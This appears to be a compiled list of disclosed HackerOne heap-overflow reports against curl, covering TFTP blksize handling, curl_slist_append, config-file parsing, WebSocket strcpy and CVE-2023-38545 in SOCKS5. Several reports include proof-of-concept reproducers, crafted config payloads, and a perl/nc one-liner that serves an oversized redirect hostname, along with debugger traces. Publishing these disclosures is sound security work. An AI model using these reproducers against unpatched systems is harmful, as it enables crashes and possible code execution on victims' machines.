# Heap Overflow

_24 reports — High/Critical, disclosed_

### [Heap Buffer Overflow in TFTP](https://hackerone.com/reports/3444904)

- **Report ID:** `3444904`
- **Severity:** Critical
- **Weakness:** Heap Overflow
- **Program:** curl
- **Reporter:** @helspy
- **Bounty:** - usd
- **Disclosed:** 2025-12-01T07:41:33.559Z
- **CVE(s):** -

**Vulnerability Information:**

# Summary:
A heap buffer overflow vulnerability exists in the TFTP implementation of libcurl. The vulnerability is triggered when a malicious TFTP server sends an OACK (Option  acknowledgment) packet with a blksize option that is larger than the default block size (512 bytes). libcurl updates its internal block size variable but fails to reallocate the receive and send buffers (rpacket and spacket). When the application subsequently receives data (in tftp_rx) or sends data (in tftp_tx) using the larger block size, it writes past the end of the allocated buffer, leading to a heap buffer overflow.


# Affected version
**curl 8.18.0-DEV** (based on LIBCURL_VERSION in  include/curl/curlver.h) Platform: Windows (reproduced on)


# Steps To Reproduce:
1. Save the provided reproduction script as tftp_repro.py.
2. Run the script: python tftp_repro.py. This starts a malicious TFTP server on port 6969.
3. In another terminal, run a curl command to fetch a file from this server: curl tftp://localhost:6969/test (Note: Ensure you are using a curl build that includes this vulnerable code. If testing with a system curl, it might not be vulnerable or might be a different version).
4. The server will send an OACK with blksize=2048 and then a DATA packet of 2048 bytes.
5. The curl client will crash or exhibit undefined behavior due to the heap overflow.

# Supporting Material/References:
Vulnerable Code Location: **lib/tftp.c**, function: **tftp_parse_option_ack**
 updates **state->blksize** without reallocating **state->spacket.data** and **state->rpacket.data**.
Reproduction Script: **tftp_repro.py**

## Impact

# Summary:
This vulnerability allows a malicious TFTP server to cause a heap buffer overflow on the client.

**Remote Code Execution (RCE)**: By carefully crafting the payload in the DATA packet, an attacker could overwrite critical heap metadata or function pointers, potentially leading to arbitrary code execution on the victim's machine with the privileges of the curl process.

**Denial of Service (DoS)**: The overflow can corrupt memory structures, causing the curl application to crash or behave unpredictably, leading to a denial of service.

## Impact

## Summary:
This vulnerability allows a malicious TFTP server to cause a heap buffer overflow on the client.

**Remote Code Execution (RCE)**: By carefully crafting the payload in the DATA packet, an attacker could overwrite critical heap metadata or function pointers, potentially leading to arbitrary code execution on the victim's machine with the privileges of the curl process.
**Denial of Service (DoS)**: The overflow can corrupt memory structures, causing the curl application to crash or behave unpredictably, leading to a denial of service.

---

### [Heap Buffer Overflow in libcurl curl_slist_append via Unterminated String](https://hackerone.com/reports/3229490)

- **Report ID:** `3229490`
- **Severity:** High
- **Weakness:** Heap Overflow
- **Program:** curl
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2025-06-30T07:23:15.767Z
- **CVE(s):** -

**Vulnerability Information:**

#Summary
A heap buffer overflow vulnerability exists in libcurl's `curl_slist_append()` function in `lib/slist.c:94`. When the function is called with a non-null-terminated string, the internal `strdup()` call triggers `strlen()` to read beyond allocated buffer boundaries, leading to a heap buffer overflow. This vulnerability can be triggered through various libcurl APIs that process user-controlled string data without proper null termination validation.


#Steps to Reproduce (STR/POC):
  1. Allocate a buffer of any size (e.g., 256 bytes)
  2. Fill the buffer completely with non-null bytes (no null terminator)
  3. Call curl_slist_append(NULL, buffer)
  4. The strlen() call within strdup() will read past the buffer boundary
  5. AddressSanitizer detects heap buffer overflow

  Minimal reproducer:
```c
  char *buffer = malloc(256);
  memset(buffer, 'A', 256); // No null termination
  curl_slist_append(NULL, buffer); // Triggers overflow
```

{F4507009}

Built and tested with libcurl, git commit `a487a4e4bddb301e44360c09a8167adc52c31e71`.

## Impact

Impact:
  - Confidentiality: High - Out-of-bounds read can leak sensitive heap memory contents
  - Integrity: Low - Limited write capability
  - Availability: Medium - Potential denial of service via crash

  The vulnerability allows attackers to:
  1. Read arbitrary heap memory beyond allocated boundaries
  2. Potentially crash applications using libcurl
  3. In some scenarios, may lead to information disclosure of sensitive data from adjacent heap allocations

  Attack Vectors:
  - HTTP header processing
  - URL parsing with malformed components
  - Cookie handling
  - Custom request methods
  - Any libcurl API accepting string parameters

  CVSS Score: 7.3 (High)

  CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L

**Summary (researcher):**

# libcurl heap-buffer-overflow: API contract vs. memory safety — you decide.

An easily reproducible heap buffer overflow exists in libcurl’s `curl_slist_append()` function, triggered by passing a non-NUL-terminated string. The function internally calls `strdup()`, which in turn invokes `strlen()` with no bounds check—leading to out-of-bounds heap reads if the input isn’t NUL-terminated.

## Steps to Reproduce:
	•	Allocate a buffer, e.g. 256 bytes.
	•	Fill it with non-zero bytes; don’t NUL-terminate.
	•	Call curl_slist_append(NULL, buffer);
	•	Observe AddressSanitizer reporting a heap-buffer-overflow.

## Minimal PoC:
```
#include <curl/curl.h>
#include <stdlib.h>
#include <string.h>
int main() {
  char *buf = malloc(4);
  memcpy(buf, "\xbc\x07\x7a\x02", 4); // No NUL
  curl_slist_append(NULL, buf); // 💥 Heap overflow
  free(buf);
}
```

Command:
```bash
clang -fsanitize=address -g poc.c -lcurl -o curl_poc
./curl_poc
```
## Impact:
> Confidentiality: High — arbitrary heap memory can be leaked.
> Availability: Medium — easy DoS/crash on malformed input.
> Integrity: Low — limited to reading, not writing.

Attack surface: Any code, binding, or fuzz harness using libcurl and `not strictly validating NUL-termination on user input` (think FFI in Rust, Go, Python, etc.)

## Why This Still Matters:
> C contracts ≠ modern memory safety.
> Hardened builds, fuzzing, and language bindings can all hit this crash in the real world.
> Just because the spec says “don’t do that” doesn’t mean you should ship APIs that crash on malformed input.

### Takeaway:
If you want to break (or secure) memory in 2025, don’t trust legacy API contracts.
Trust code that enforces bounds, even when nobody’s watching.

> “We don’t blame the maintainers for upholding a legacy view of C.
> But we also don’t stop at ‘Not Applicable.’
> Because memory doesn’t care about intent. It cares about bounds.”

Stay glitchy,
@geeknik

---

### [Heap‑based buffer overflow in curl -K <config_file> allows arbitrary write .](https://hackerone.com/reports/3094406)

- **Report ID:** `3094406`
- **Severity:** High
- **Weakness:** Heap Overflow
- **Program:** curl
- **Reporter:** @bsr13
- **Bounty:** - usd
- **Disclosed:** 2025-04-27T16:00:11.228Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
  A heap‑based buffer overflow in curl’s config‑file parser (`parseconfig()` --> `getparameter()`) allows an attacker supplying a crafted config file to overwrite internal pointers (via `cleanarg()`), leading to a write‑what‑where primitive and potential remote code execution.


## Affected version
  -curl 8.13.0 (x86_64-pc-linux-gnu) libcurl/8.13.0 OpenSSL/3.0.13 libpsl/0.21.2
    Release-Date: 2025-04-02

  - or any Version after  version 8.13.0 (dev-versions) that include `cleanarg()` and have writable argv support



## Steps To Reproduce:
 - tested on both Ubuntu 24.04.1 [Linux bobo-pc-1701 6.11.0-21-generic #21~24.04.1-Ubuntu ] AND 
                  Kali 6.11.2-1kali1 [Linux kali 6.11.2-amd64]  

  1. Download the last release from github and unizp it: 
    wget https://github.com/curl/curl/releases/download/curl-8_13_0/curl-8.13.0.zip && unzip curl-8.13.0.zip && cd curl-8.13.0

  2. Build and install: 
    ./configure --with-openssl
     make all && sudo make install 
     curl --version

  3.  -The crash could be caused by crafted config file that contains one of this payloads;
       -> It could be appended anywhere in new line in config-file;
       -> All the inputs lead to one crash path.
 
            echo -ne "-vvvuAAAA" > malicious_config_file1.conf     (u for --user <user:password> )
            echo -ne "-vvvUAAAA" > malicious_config_file2.conf     (U for --proxy-user <user:password> )
            echo -ne "-vvvEAAAA" > malicious_config_file3.conf     (E for --cert <certificate[:password]> )

  
  4. 
       curl -K malicious_config_file1.conf  
       zsh: segmentation fault  curl -K malicious_config_file1.conf
     ---------------- Or ------------------
     curl -K malicious_config_file2.conf 
        zsh: segmentation fault  curl -K malicious_config_file2.conf
      ---------------- Or ------------------
     curl -K malicious_config_file3.conf 
        zsh: segmentation fault  curl -K malicious_config_file3.conf
 
  >> sudo dmesg |tail -n 6

        [176771.791272] curl[132987]: segfault at 5 ip 00007f3a8db8b75d sp 00007ffd419fd958 error 4 in libc.so.6[18b75d,7f3a8da28000+188000] likely on CPU 3 (core 3, socket 0)
        [176771.791357] Code: 00 00 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 89 f8 48 89 fa c5 f9 ef c0 25 ff 0f 00 00 3d e0 0f 00 00 0f 87 33 01 00 00 <c5> fd 74 0f c5 fd d7 c1 85 c0 74 57 f3 0f bc c0 c5 f8 77 c3 66 66

        [176778.655937] curl[132996]: segfault at 5 ip 0000792ad5f8b75d sp 00007fff028cfc18 error 4 in libc.so.6[18b75d,792ad5e28000+188000] likely on CPU 6 (core 2, socket 1)
        [176778.656011] Code: 00 00 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 89 f8 48 89 fa c5 f9 ef c0 25 ff 0f 00 00 3d e0 0f 00 00 0f 87 33 01 00 00 <c5> fd 74 0f c5 fd d7 c1 85 c0 74 57 f3 0f bc c0 c5 f8 77 c3 66 66

        [176783.987409] curl[133003]: segfault at 5 ip 000079c33cd8b75d sp 00007ffe06464158 error 4 in libc.so.6[18b75d,79c33cc28000+188000] likely on CPU 0 (core 0, socket 0)
        [176783.987474] Code: 00 00 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 89 f8 48 89 fa c5 f9 ef c0 25 ff 0f 00 00 3d e0 0f 00 00 0f 87 33 01 00 00 <c5> fd 74 0f c5 fd d7 c1 85 c0 74 57 f3 0f bc c0 c5 f8 77 c3 66 66


## Triaging the crash: 
 1.To triage this we need to build with extra flags:  

    >> CFLAGS="-fsanitize=address,undefined -g -O0 -fno-omit-frame-pointer" ./configure --with-openssl    
    >> make all && sudo make install 

  2.Run curl : 
    ------------------------------------- Asan output ----------------------------------
    pc@pc22:~/Downloads$ curl -K malicious_config_file1.conf 
    AddressSanitizer:DEADLYSIGNAL
    ------------------------------------------------------------------------------------
          ==140300==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000005 (pc 0x72133b58b75d bp 0x7ffe1b2c0b20 sp 0x7ffe1b2c02a8 T0)
          ==140300==The signal is caused by a READ memory access.
          ==140300==Hint: address points to the zero page.
              #0 0x72133b58b75d in __strlen_avx2 ../sysdeps/x86_64/multiarch/strlen-avx2.S:76
              #1 0x63e45d7996dc in cleanarg /home/bobo/Downloads/curl-8.13.0/src/tool_getparam.c:583
              #2 0x63e45d7b2d19 in getparameter /home/bobo/Downloads/curl-8.13.0/src/tool_getparam.c:2901
              #3 0x63e45d7b1ad8 in getparameter /home/bobo/Downloads/curl-8.13.0/src/tool_getparam.c:2790
              #4 0x63e45d7b4205 in parse_args /home/bobo/Downloads/curl-8.13.0/src/tool_getparam.c:3016
              #5 0x63e45d7b76ba in main /home/bobo/Downloads/curl-8.13.0/src/tool_main.c:284

      AddressSanitizer can not provide additional info.
      SUMMARY: AddressSanitizer: SEGV ../sysdeps/x86_64/multiarch/strlen-avx2.S:76 in __strlen_avx2
      ==140300==ABORTING

  - We can Also confirm the crash path using gdb (with GEF extension installed ):
    >> gdb curl 
    (gef)> r -K malicious_config_file1.conf
    (gef)> where 
    --------------------------------- gdb output ------------------------------------------------------
      #0  __strlen_avx2 () at ../sysdeps/x86_64/multiarch/strlen-avx2.S:76
      #1  0x00007ffff787d827 in ___interceptor_strlen (s=0x5 <error: Cannot access memory at address 0x5>) at ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:389
      #2  0x00005555555926dd in cleanarg (str=0x5 <error: Cannot access memory at address 0x5>) at tool_getparam.c:583
      #3  0x00005555555abd1a in getparameter (flag=0x50300000f281 "vvvuAAAA", nextarg=0x50300000f285 "AAAA", cleararg1=0x0, cleararg2=0x0, usedarg=0x7fffffffd79e, global=0x7ffff4300030, 
          config=0x51a000000080) at tool_getparam.c:2901
      #4  0x00005555555b9434 in parseconfig ()
      #5  0x00005555555aaad9 in getparameter (flag=0x7fffffffe1b8 "K", nextarg=0x7fffffffe1ba "malicious_config_file1.conf", cleararg1=0x7fffffffe1b7 "-K", 
          cleararg2=0x7fffffffe1ba "malicious_config_file1.conf", usedarg=0x7ffff4200030, global=0x7ffff4300030, config=0x51a000000080) at tool_getparam.c:2790
      #6  0x00005555555ad206 in parse_args (global=0x7ffff4300030, argc=0x3, argv=0x7fffffffde48) at tool_getparam.c:3016
      #7  0x00005555555b6a45 in operate ()
      #8  0x00005555555b06bb in main (argc=0x3, argv=0x7fffffffde48) at tool_main.c:284
  --------------------------------- Code ----------------------------------------------------------------------
          0x7ffff678b74d <__strlen_avx2+000d> and    eax, 0xfff
          0x7ffff678b752 <__strlen_avx2+0012> cmp    eax, 0xfe0
          0x7ffff678b757 <__strlen_avx2+0017> ja     0x7ffff678b890 <__strlen_avx2+336>
        → 0x7ffff678b75d <__strlen_avx2+001d> vpcmpeqb ymm1, ymm0, YMMWORD PTR [rdi]         // $rdi = 0x5 so unvalid address 
          0x7ffff678b761 <__strlen_avx2+0021> vpmovmskb eax, ymm1
          0x7ffff678b765 <__strlen_avx2+0025> test   eax, eax
          0x7ffff678b767 <__strlen_avx2+0027> je     0x7ffff678b7c0 <__strlen_avx2+128>
          0x7ffff678b769 <__strlen_avx2+0029> tzcnt  eax, eax
          0x7ffff678b76d <__strlen_avx2+002d> vzeroupper 
  -------------------------------------------------------------------------------------------------------------
    - From the above output we can see that: 
     1.the root cause of the crash is that strlen tried to load the data at invalid address (0x5), So it’s an invalid pointer dereference into unmapped memory.
    
     2. --------
     #2  0x00005555555926dd in cleanarg (str=0x5 <error: Cannot access memory at address 0x5>) at tool_getparam.c:583
     #3  0x00005555555abd1a in getparameter (flag=0x50300000f281 "vvvuAAAA", nextarg=0x50300000f285 "AAAA", cleararg1=0x0, cleararg2=0x0, usedarg=0x7fffffffd79e, global=0x7ffff4300030, 
        config=0x51a000000080) at tool_getparam.c:2901

     Moreever, we can see that the crash happened in `getparameter()` function tool_getparam.c:2901, which calls `cleanarg(clearthis)` with invalid address which passed to strlen.  

     3. In order to understand where is the invalid address come from , I set a breakpoint in gdb just before `cleanarg(clearthis)` in tool_getparam.c:2901 and tool_getparam.c:2900 ( - Not that for other options like --proxy-user [U] or --cert(E) you have to set breakpoints at different lines in tool_getparam.c )

       see:   https://github.com/curl/curl/blob/master/src/tool_getparam.c#L2898-L2902
        
```
2898     case C_USER: /* --user */
2899       /* user:password  */
2900       err = getstr(&config->userpwd, nextarg, ALLOW_BLANK); //------set break point here  ----
2901       cleanarg(clearthis);                                  //--------- set break point here  --------       
2902       break;

```
 
        >> gdb curl 
        (gef)> break tool_getparam.c:2900
        (gef)> break tool_getparam.c:2901
        (gef)> r -K malicious_config_file1.conf

              ──────────────────────source:tool_getparam.c+2900 ───────────────
```
2895	     case C_UPLOAD_FILE: /* --upload-file */
2896	       err = parse_upload_file(config, nextarg);
2897	       break;
2898	     case C_USER: /* --user */
2899	       /* user:password  */
// nextarg=0x00007fffffffd5a0  →  [...]  →  0xbebebe0041414141 ("AAAA"?), config=0x00007fffffffd578  →  [...]  →  0x0000000000000000
●-> 2900	       err = getstr(&config->userpwd, nextarg, ALLOW_BLANK);
●  2901	       cleanarg(clearthis);
2902	       break;
2903	     case C_PROXY_USER: /* --proxy-user */
2904	       /* Proxy user:password  */
2905	       err = getstr(&config->proxyuserpwd, nextarg, ALLOW_BLANK);
```           
             ────────────── threads ─────────────
              [#0] Id 1, Name: "curl", stopped 0x5555555abc83 in getparameter (), reason: BREAKPOINT
              ────────────── trace ──────────────
              [#0] 0x5555555abc83 → getparameter(flag=0x50300000f281 "vvvuAAAA", nextarg=0x50300000f285 "AAAA", cleararg1=0x0, cleararg2=0x0, usedarg=0x7fffffffd79e, global=0x7ffff4300030, config=0x51a000000080)
              [#1] 0x5555555b9434 → parseconfig()
              [#2] 0x5555555aaad9 → getparameter(flag=0x7fffffffe1b9 "K", nextarg=0x7fffffffe1bb "malicious_config_file1.conf", cleararg1=0x7fffffffe1b8 "-K", cleararg2=0x7fffffffe1bb "malicious_config_file1.conf", usedarg=0x7ffff4200030, global=0x7ffff4300030, config=0x51a000000080)
              [#3] 0x5555555ad206 → parse_args(global=0x7ffff4300030, argc=0x3, argv=0x7fffffffde48)
              [#4] 0x5555555b6a45 → operate()
              [#5] 0x5555555b06bb → main(argc=0x3, argv=0x7fffffffde48)
              ──────────────────────────────────────────────────────────────
            
              (gef)> p clearthis 
                   $1 = 0x5 <error: Cannot access memory at address 0x5>
              


             -> We hit at the first breakpoint and we confirmed that the clearthis value has been modified (invalid address)
             -> then we verified where the variable clearthis could be modified in the code (tool_getparam.c)
           
               See:   https://github.com/curl/curl/blob/master/src/tool_getparam.c#L1787-L1798
 ```
1787   #ifdef HAVE_WRITABLE_ARGV
1788           clearthis = &cleararg1[parse + 2 - flag];
1789   #endif
1790         }
1791         else if(!nextarg) {
1792           err = PARAM_REQUIRES_PARAMETER;
1793           break;
1794         }
1795         else {
1796   #ifdef HAVE_WRITABLE_ARGV
1797           clearthis = cleararg2;
1798   #endif
```
             
            -> Now we know that if the palfrom supports writable argv[], the clearthis is calculated with the following expression
                                
                                ---> Clearthis = &cleararg1[parse + 2 - flag];     

                  (gef)>  p &parse
                     $12 = (const char **) 0x7fffffffd5c0
                  (gef)> p parse
                     $13 = 0x50300000f284 "uAAAA"
                  ------------------------- 
                  (gef)> p &flag 
                      $14 = (const char **) 0x7fffffffd5a8
                  (gef)> p flag
                    $15 = 0x50300000f281 "vvvuAAAA"
                  -------------------------
                  (gef)> p &cleararg1
                    $16 = (char **) 0x7fffffffd598
                  (gef) = p cleararg1
                    $17 = 0x0
                  -------------------------
                  (gef)> p parse+2-flag     
                    $17 = 0x5             // 0x50300000f284 +2 - 0x50300000f281

              -> From the above output we can see that the value of clearthis is: (2 +  the number of "v" letters [in our example ] = 0x5 ), which means that an attacker could partially control the what's written in [rdi] register which may lead to arbitrary read/write or code execution.
            
      ## Fix suggestions: 
         I'm not entirely sure this is the ideal fix since I'm not an expert in C programming, but here's the best approach I could come up with: 

        - Since we know exactly where clearthis is supposed to point (somewhere within the cleararg1 buffer), we can validate the pointer by ensuring it falls within the bounds of that buffer and points to a NUL-terminated string so we can safely use the pointer without risking out-of-bounds access or undefined behavior.


      ## Possible exploitation Scenarios: 
         - Chain multiple overwrites:  if an attacker managed to call cleanarg(), he might be able to accumulate a larger total write.

        - Achieving arbitrary code execution would be highly complex especially on x64 bit, However advanced exploitation techniques **such as partial pointer overwrites, feg shui or heap grooming (e.g., manipulating allocations to position attacker-controlled buffers adjacent to sensitive heap structures) ** could theoretically enable an attacker to overwrite function pointers and hijack control flow.
        
        - This also could leak heap contents (pointers or secrets)

        Note  that : ** the above attacks are more likely to occur in x86 bit architechure **


## Supporting Material/References:
  - CWE-122: Heap-based Buffer Overflow: https://cwe.mitre.org/data/definitions/122.html

## Impact

- Arbitrary Write: An attacker might achieve a write‑what‑where condition, which allow to modify arbitrary memory locations within the process’s address space.

- Potential Remote Code Execution: With advanced techniques (partial pointer overwrite, heap grooming, ...), the attacker could overwrite function pointers or return addresses, leading to full control of execution flow and the ability to run arbitrary code as the curl process.

- Information Disclosure: pointing clearthis at attacker-chosen addresses and calling strlen() can leak heap contents (such as pointers, secrets, or other sensitive data) by returning string lengths or causing controlled crashes.

---

### [Buffer Overflow Vulnerability in WebSocket Handling](https://hackerone.com/reports/2298307)

- **Report ID:** `2298307`
- **Severity:** High
- **Weakness:** Heap Overflow
- **Program:** curl
- **Reporter:** @hackers_
- **Bounty:** - usd
- **Disclosed:** 2024-01-02T08:15:26.866Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hello security team,
Hope you are doing well :)

I would like to report a potential security vulnerability in the WebSocket handling code of the curl library. The issue is related to the usage of the `strcpy` function, which can lead to a buffer overflow if the length of the input is not properly checked. The vulnerable code snippet is located at [this link](https://github.com/curl/curl/blob/e251e858b941e29bb95a6c0d26bb45981a872585/lib/ws.c#L581).

## Steps To Reproduce:

1. Trigger the WebSocket functionality with a crafted request.
2. Provide a base64-encoded nonce value that exceeds the buffer size.
3. Observe that the `strcpy` function is used without proper bounds checking.

## Fix:
To address this issue, it is recommended to replace the `strcpy` function with the safer alternative `strncpy` and explicitly specify the maximum length to copy. Here's an example fix:

```c
strncpy(keyval, randstr, sizeof(keyval) - 1);
keyval[sizeof(keyval) - 1] = '\0';  // Null-terminate the string
```

This modification ensures that only a specified number of characters (up to the buffer size minus 1) are copied, preventing buffer overflow.

## Reference:
https://cwe.mitre.org/data/definitions/122.html

## Impact

This vulnerability may allow an attacker to execute arbitrary code, potentially leading to a compromise of the application or system. An attacker could exploit this weakness by providing a specially crafted WebSocket request, causing a buffer overflow and overwriting adjacent memory.

---

### [CVE-2023-38545: socks5 heap buffer overflow](https://hackerone.com/reports/2187833)

- **Report ID:** `2187833`
- **Severity:** High
- **Weakness:** Heap Overflow
- **Program:** curl
- **Reporter:** @raysatiro
- **Bounty:** - usd
- **Disclosed:** 2023-10-11T06:38:42.118Z
- **CVE(s):** CVE-2023-38545

**Vulnerability Information:**

# Summary:

The SOCKS5 state machine can be manipulated by a remote attacker to overflow heap memory if four conditions are met:

1. The request is made via socks5h.
2. The state machine's negotiation buffer is smaller than ~65k.
3. The SOCKS server's "hello" reply is delayed.
4. The attacker sets a final destination hostname larger than the negotiation
buffer.

libcurl is supposed to disable SOCKS5 remote hostname resolution for hostnames larger than 255 but will not due to a state machine bug.

For example tor user running libcurl app with follow location that connects to rogue onion server that replies with payload in `Location:` header which causes crash or worse.

# Walkthrough:

`do_SOCKS` initializes local variable `socks5_resolve_local` depending on the `CURLPROXY_` name. There are two relevant names for this state machine:

- `CURLPROXY_SOCKS5` (SOCKS5 with local resolve of dest host)
- `CURLPROXY_SOCKS5_HOSTNAME` (SOCKS5 with remote resolve of dest host)

[Code:](https://github.com/curl/curl/blob/curl-8_3_0/lib/socks.c#L573-L574)
~~~c
  bool socks5_resolve_local =
    (conn->socks_proxy.proxytype == CURLPROXY_SOCKS5) ? TRUE : FALSE;
~~~

For this scenario, `CURLPROXY_SOCKS5_HOSTNAME` is the name and `socks5_resolve_local` is initialized FALSE.

The `do_SOCKS` state machine is entered for the first time for the connection. `sx->state` is `CONNECT_SOCKS_INIT` (which happens to be the first label). In that state the hostname length is checked and if too long to resolve remotely (>255) then it sets `socks5_resolve_local` to TRUE.

[Code:](https://github.com/curl/curl/blob/curl-8_3_0/lib/socks.c#L588-L593)
~~~c
    /* RFC1928 chapter 5 specifies max 255 chars for domain name in packet */
    if(!socks5_resolve_local && hostname_len > 255) {
      infof(data, "SOCKS5: server resolving disabled for hostnames of "
            "length > 255 [actual len=%zu]", hostname_len);
      socks5_resolve_local = TRUE;
    }
~~~

The local variable `socks5_resolve_local` is changed but, because this is a state machine, subsequent calls to `do_SOCKS` are in a different state and do not make the same change. ==**This is the bug.**==

For this scenario, the hostname is longer than 255 characters and `do_SOCKS` is on a subsequent call, which means `socks5_resolve_local` remains FALSE. This can happen by chance or be forced by an attacker.

The client "hello" SOCKS packet contains available methods and is sent to the server. State `CONNECT_SOCKS_READ_INIT` => `CONNECT_SOCKS_READ` is entered to parse the server "hello" packet (method selection reply). The server has not yet replied so `do_SOCKS` returns `CURLPX_OK`.

[Code:](https://github.com/curl/curl/blob/curl-8_3_0/lib/socks.c#L640-L662)
~~~c
CONNECT_SOCKS_READ_INIT:
  case CONNECT_SOCKS_READ_INIT:
    sx->outstanding = 2; /* expect two bytes */
    sx->outp = socksreq; /* store it here */
    /* FALLTHROUGH */
  case CONNECT_SOCKS_READ:
    presult = socks_state_recv(cf, sx, data, CURLPX_RECV_CONNECT,
                               "initial SOCKS5 response");
    if(CURLPX_OK != presult)
      return presult;
    else if(sx->outstanding) {
      /* remain in reading state */
      return CURLPX_OK;
    }
    else if(socksreq[0] != 5) {
      failf(data, "Received invalid version in initial SOCKS5 response.");
      return CURLPX_BAD_VERSION;
    }
    else if(socksreq[1] == 0) {
      /* DONE! No authentication needed. Send request. */
      sxstate(sx, data, CONNECT_REQ_INIT);
      goto CONNECT_REQ_INIT;
    }
~~~

On a subsequent call `do_SOCKS` is in the same state where it's waiting for the initial server reply. If the reply is valid, and in this scenario it is, then the state machine will goto `CONNECT_REQ_INIT` which will goto `CONNECT_RESOLVE_REMOTE` since `socks5_resolve_local` is FALSE.

[Code:](https://github.com/curl/curl/blob/curl-8_3_0/lib/socks.c#L781-L797)
~~~c
CONNECT_REQ_INIT:
  case CONNECT_REQ_INIT:
    if(socks5_resolve_local) {
      enum resolve_t rc = Curl_resolv(data, sx->hostname, sx->remote_port,
                                      TRUE, &dns);

      if(rc == CURLRESOLV_ERROR)
        return CURLPX_RESOLVE_HOST;

      if(rc == CURLRESOLV_PENDING) {
        sxstate(sx, data, CONNECT_RESOLVING);
        return CURLPX_OK;
      }
      sxstate(sx, data, CONNECT_RESOLVED);
      goto CONNECT_RESOLVED;
    }
    goto CONNECT_RESOLVE_REMOTE;
~~~

In `CONNECT_RESOLVE_REMOTE` the hostname is copied into the socksreq buffer. The code assumes the hostname is <= 255 characters which as discussed above is not guaranteed.

[Code:](https://github.com/curl/curl/blob/curl-8_3_0/lib/socks.c#L904-L911)
~~~c
      else {
        socksreq[len++] = 3;
        socksreq[len++] = (char) hostname_len; /* one byte address length */
        memcpy(&socksreq[len], sx->hostname, hostname_len); /* w/o NULL */
        len += hostname_len;
      }
      infof(data, "SOCKS5 connect to %s:%d (remotely resolved)",
            sx->hostname, sx->remote_port);
~~~

`socksreq` points to the temporary download buffer (ie `data->state.buffer`) which was repurposed to send/receive the SOCKS negotiation since the transfer is not yet downloading.

If the size of the hostname exceeds the remaining size of the buffer then there is a buffer overflow. If the size of the hostname maxes out but does not exceed the remaining size then there is an overflow when the buffer is next written to.

Regardless, at this point we know from checks beforehand that hostname length is shorter than 65535 (`MAX_URL_LEN`) and the full size of buffer is at least `data->set.buffer_size + 1`.

[Code:](https://github.com/curl/curl/blob/curl-8_3_0/lib/url.c#L1808-L1811)
~~~c
  else if(strlen(data->state.up.hostname) > MAX_URL_LEN) {
    failf(data, "Too long host name (maximum is %d)", MAX_URL_LEN);
    return CURLE_URL_MALFORMAT;
  }
~~~

[Code:](https://github.com/curl/curl/blob/curl-8_3_0/lib/multi.c#L1858-L1861)
~~~c
CURLcode Curl_preconnect(struct Curl_easy *data)
{
  if(!data->state.buffer) {
    data->state.buffer = malloc(data->set.buffer_size + 1);
~~~

`data->set.buffer_size` varies. Before the allocation above, libcurl has set `data->set.buffer_size` to a default 16384 (see `READBUFFER_SIZE` aka `CURL_MAX_WRITE_SIZE`) which could have been overridden by the user via `CURLOPT_BUFFERSIZE`. A significant example of this is the curl tool uses `CURLOPT_BUFFERSIZE` to set the size to its own default 102400, or user setting from `--limit-rate` if that value is smaller than 100k.

The two buffer size configurations that are likely widely used are 16384+1 for libcurl apps without `CURLOPT_BUFFERSIZE` and 102400+1 for curl tool commands without a low `--limit-rate`. For the former the buffer can be overflowed and for the latter it can't: 16384+1 < 65535 < 102400+1.

The characters that are allowed for hostname depend on if libcurl was built with IDN support. If it was built with IDN support then as long as the hostname contains characters < 0x80 no IDN conversion is attempted. For the higher value characters it seems very unlikely they would pass through but would depend on the IDN library. Without IDN support the characters pass through. For example `Location: http://\xff\r\n` will pass through without IDN.

[Code:](https://github.com/curl/curl/blob/curl-8_3_0/lib/idn.c#L131-L144)
~~~c
bool Curl_is_ASCII_name(const char *hostname)
{
  /* get an UNSIGNED local version of the pointer */
  const unsigned char *ch = (const unsigned char *)hostname;

  if(!hostname) /* bad input, consider it ASCII! */
    return TRUE;

  while(*ch) {
    if(*ch++ & 0x80)
      return FALSE;
  }
  return TRUE;
}
~~~

[Code:](https://github.com/curl/curl/blob/curl-8_3_0/lib/idn.c#L261-L265)
~~~c
#ifdef USE_IDN
  /* Check name for non-ASCII and convert hostname if we can */
  if(!Curl_is_ASCII_name(host->name)) {
    char *decoded;
    CURLcode result = idn_decode(host->name, &decoded);
~~~

# Steps To Reproduce:

The attacker needs to control the hostname. For example, the user has set `CURLOPT_FOLLOWLOCATION` (`--location` for the curl tool) so that libcurl will follow redirects. The attacker would need control of the hostname in the location header.

The attacker needs the state machine to be delayed, as discussed earlier. For example, the attacker controls the SOCKS server and delays the initial server hello.

The attacker probably needs to know how large `data->set.buffer_size` is and how the memory is typically allocated, like what comes after `data->state.buffer` in the heap. For example, the attacker has a copy of the program that is using libcurl and can debug it in a similar environment.

# Supporting Material/References:

~~~
Unhandled exception at 0x6e1557be (libcurld.dll) in curld.exe: 0xC0000005: Access violation reading location 0x41414141.
~~~
Refer to attached screenshot Capture.PNG.

~~~
HEAP[curld.exe]: Heap block at 005F8200 modified at 005FC22D past requested size of 4025
~~~
Note 4025 is in hex, in decimal it is 16421 which is 16384+1+heap guard bytes.

~~~
while true; do { perl -e 'print ("HTTP/1.1 301 Moved\r\nContent-Length: 0\r\nConnection: Close\r\nLocation: http://");print("A"x65535);print("\r\n\r\n")'; sleep 2; } | nc -4l [yourip] 8000; done
~~~

start a socks5 server on remoteip (for the latency) and run curl repeatedly until it reads from 0x41414141 (AAAAA....)
~~~
curl -v --limit-rate 16384 --location --proxy socks5h://[remoteip]:1080 http://[yourip]:8000
~~~

if making the socks server remote doesn't work for latency you'd have to modify its source or force it via libcurl source
~~~
   case CONNECT_SOCKS_READ:
+    {
+      static bool x = 0;
+      if(++x == 2)
+        return CURLPX_OK;
+    }
     presult = socks_state_recv(cf, sx, data, CURLPX_RECV_CONNECT,
                                "initial SOCKS5 response");
~~~

# Solution

Refer to attached patch curl_security_fix.patch. It fixes the issue by changing the remote resolve check to return error `CURLPX_LONG_HOSTNAME` if dest host is larger than 255.

## Impact

# Impact

